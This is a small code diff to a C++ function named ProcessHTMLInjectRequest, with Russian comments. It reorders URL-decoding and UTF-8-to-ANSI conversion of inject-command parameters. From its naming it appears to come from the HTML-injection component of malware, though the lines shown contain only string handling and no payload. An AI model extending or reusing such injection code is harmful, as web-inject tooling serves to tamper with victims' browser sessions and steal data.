@@ -93,11 +93,11 @@ bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequ
 		CmdStr.Copy(URL, 0, CmdLen);
 
 		// Преобразовываем из UTF8 в Ansi
-		PCHAR P = UTF8ToAnsi(Params);
+		string EP = URLDecode(Params);
 
-		string EP = URLDecode(P);
-
-        STR::Free(P);
+		PCHAR P = UTF8ToAnsi(EP.t_str());
+		EP = P;
+		STR::Free(P);
 
 //		string F;
 //		F.Format("Выполняется команда инжекта: %s; Параметры: %s", CmdStr.t_str(), EP.t_str());
